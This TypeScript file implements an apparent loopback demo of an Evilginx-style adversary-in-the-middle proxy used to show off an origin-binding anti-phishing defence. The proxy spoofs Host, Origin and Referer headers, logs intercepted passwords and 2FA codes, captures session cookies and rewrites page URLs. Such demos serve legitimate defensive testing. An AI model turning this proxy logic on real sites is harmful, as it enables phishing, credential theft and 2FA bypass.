import * as http from 'node:http';

export interface EvilProxyInstance {
  server: http.Server;
  port: number;
  targetPort: number;
  Close: () => Promise<void>;
}

function collectStreamBuffer(stream: http.IncomingMessage): Promise<Buffer> {
  return new Promise((resolve, reject) => {
    const chunks: Buffer[] = [];
    stream.on('data', (chunk: Buffer) => chunks.push(chunk));
    stream.on('end', () => resolve(Buffer.concat(chunks)));
    stream.on('error', reject);
  });
}

/**
 * Launches the Simulated Loopback AiTM Reverse Proxy on `http://localhost:8080`
 * targeting the upstream Protected Vault Server on `http://localhost:3000`.
 *
 * Demonstrates:
 * 1. HTTP Header Spoofing (`Host: localhost:3000`, `Origin: http://localhost:3000`, `Referer: http://localhost:3000/`)
 * 2. Response Body String Rewriting (`sub_filter` replacing `http://localhost:3000` -> `http://localhost:8080`)
 * 3. Credential & 2FA Interception on `POST /api/login` (while failing to decrypt the RSA-OAEP `_originlock_token`)
 * 4. Upstream `Set-Cookie` Capture (demonstrating how the proxy ingests the poisoned Honeypot Canary token)
 */
export function startEvilProxyServer(
  proxyPort = 8080,
  targetPort = 3000
): Promise<EvilProxyInstance> {
  const upstreamOrigin = `http://localhost:${targetPort}`;
  const proxyOrigin = `http://localhost:${proxyPort}`;

  const server = http.createServer(async (clientReq, clientRes) => {
    try {
      const method = (clientReq.method ?? 'GET').toUpperCase();
      const reqUrl = clientReq.url ?? '/';
      const reqBodyBuf = await collectStreamBuffer(clientReq);

      // Intercept POST /api/login to log captured credentials & show opaque RSA-OAEP token
      if (reqUrl.startsWith('/api/login') && method === 'POST') {
        const bodyStr = reqBodyBuf.toString('utf8');
        const params = new URLSearchParams(bodyStr);
        const username = params.get('username') ?? 'unknown';
        const password = params.get('password') ?? 'unknown';
        const totpCode = params.get('totp_code') ?? params.get('2fa_code') ?? 'unknown';
        const encryptedToken =
          params.get('_originlock_token') ??
          String(clientReq.headers['x-originlock-token'] ?? '');

        const magenta = '\x1b[35m';
        const boldMagenta = '\x1b[1;35m';
        const yellow = '\x1b[33m';
        const cyan = '\x1b[36m';
        const reset = '\x1b[0m';

        console.log(
          [
            '',
            `${boldMagenta}┌──────────────────────────────────────────────────────────────────────────────┐${reset}`,
            `${boldMagenta}│  [EVILGINX PROXY INTERCEPTED] CREDENTIALS & 2FA CAPTURED IN TRANSIT (:8080)  │${reset}`,
            `${boldMagenta}├──────────────────────────────────────────────────────────────────────────────┤${reset}`,
            `${magenta}│${reset}  ${yellow}Spoofed Outgoing Headers:${reset} Host: localhost:${targetPort} | Origin: ${upstreamOrigin}`,
            `${magenta}│${reset}  ${yellow}Intercepted Username    :${reset} ${cyan}${username}${reset}`,
            `${magenta}│${reset}  ${yellow}Intercepted Password    :${reset} ${cyan}${password}${reset}`,
            `${magenta}│${reset}  ${yellow}Intercepted 2FA TOTP    :${reset} ${cyan}${totpCode}${reset}`,
            `${magenta}│${reset}  ${yellow}OriginLock Ciphertext   :${reset} ${
              encryptedToken ? `${encryptedToken.slice(0, 42)}... (OPAQUE RSA-OAEP)` : 'NONE'
            }`,
            `${magenta}│${reset}  ${yellow}sub_filter Rewrite Try  :${reset} FAILED — Hostname is sealed with Server Public Key!`,
            `${boldMagenta}└──────────────────────────────────────────────────────────────────────────────┘${reset}`,
          ].join('\n')
        );
      }

      // Spoof HTTP headers to impersonate the legitimate origin (`localhost:3000`)
      const forwardedHeaders: http.OutgoingHttpHeaders = {
        ...clientReq.headers,
        host: `localhost:${targetPort}`,
        origin: upstreamOrigin,
        referer: `${upstreamOrigin}/`,
        'accept-encoding': 'identity',
        'x-forwarded-for': clientReq.socket.remoteAddress ?? '127.0.0.1',
      };

      if (reqBodyBuf.length > 0) {
        forwardedHeaders['content-length'] = Buffer.byteLength(reqBodyBuf);
      }

      const proxyReq = http.request(
        {
          hostname: '127.0.0.1',
          port: targetPort,
          path: reqUrl,
          method,
          headers: forwardedHeaders,
        },
        async (upstreamRes) => {
          const contentType = String(upstreamRes.headers['content-type'] ?? '');

          // Inspect Set-Cookie header from upstream server
          const setCookieHeader = upstreamRes.headers['set-cookie'];
          if (setCookieHeader && setCookieHeader.length > 0) {
            const cookieStr = Array.isArray(setCookieHeader)
              ? setCookieHeader.join('; ')
              : String(setCookieHeader);

            const yellow = '\x1b[33m';
            const boldYellow = '\x1b[1;33m';
            const cyan = '\x1b[36m';
            const reset = '\x1b[0m';

            console.log(
              [
                `${boldYellow}┌──────────────────────────────────────────────────────────────────────────────┐${reset}`,
                `${boldYellow}│  [EVILGINX PROXY SESSION HARVESTER] UPSTREAM SET-COOKIE CAPTURED             │${reset}`,
                `${boldYellow}├──────────────────────────────────────────────────────────────────────────────┤${reset}`,
                `${yellow}│${reset}  ${cyan}${cookieStr.slice(0, 74)}...${reset}`,
                `${yellow}│${reset}  Status: Saved to Evilginx session DB (Unaware cookie is a Honeypot Canary!)`,
                `${boldYellow}└──────────────────────────────────────────────────────────────────────────────┘${reset}`,
                '',
              ].join('\n')
            );
          }

          // Stream SSE events directly without buffering
          if (contentType.includes('text/event-stream')) {
            clientRes.writeHead(upstreamRes.statusCode ?? 200, upstreamRes.headers);
            upstreamRes.pipe(clientRes);
            return;
          }

          const upstreamBodyBuf = await collectStreamBuffer(upstreamRes);
          let finalBodyBuf = upstreamBodyBuf;

          // Perform Evilginx-style sub_filter string replacement on HTML/JS/JSON responses
          if (
            contentType.includes('text/html') ||
            contentType.includes('application/javascript') ||
            contentType.includes('text/javascript')
          ) {
            const originalText = upstreamBodyBuf.toString('utf8');
            const rewrittenText = originalText
              .split(upstreamOrigin)
              .join(proxyOrigin);
            finalBodyBuf = Buffer.from(rewrittenText, 'utf8');
          }

          const responseHeaders: http.OutgoingHttpHeaders = {
            ...upstreamRes.headers,
            'content-length': finalBodyBuf.length,
          };
          delete responseHeaders['transfer-encoding'];

          clientRes.writeHead(upstreamRes.statusCode ?? 200, responseHeaders);
          clientRes.end(finalBodyBuf);
        }
      );

      proxyReq.on('error', (err) => {
        clientRes.writeHead(502, { 'Content-Type': 'application/json; charset=utf-8' });
        clientRes.end(
          JSON.stringify({
            error: 'Bad Gateway (Upstream Vault Server Unreachable)',
            details: err.message,
          })
        );
      });

      if (reqBodyBuf.length > 0) {
        proxyReq.write(reqBodyBuf);
      }
      proxyReq.end();
    } catch (err) {
      const msg = err instanceof Error ? err.message : 'Proxy error';
      clientRes.writeHead(500, { 'Content-Type': 'application/json; charset=utf-8' });
      clientRes.end(JSON.stringify({ error: msg }));
    }
  });

  return new Promise((resolve, reject) => {
    server.once('error', reject);
    server.listen(proxyPort, '127.0.0.1', () => {
      resolve({
        server,
        port: proxyPort,
        targetPort,
        Close: () =>
          new Promise<void>((resClose) => {
            if (typeof server.closeAllConnections === 'function') {
              server.closeAllConnections();
            }
            server.close(() => resClose());
          }),
      });
    });
  });
}
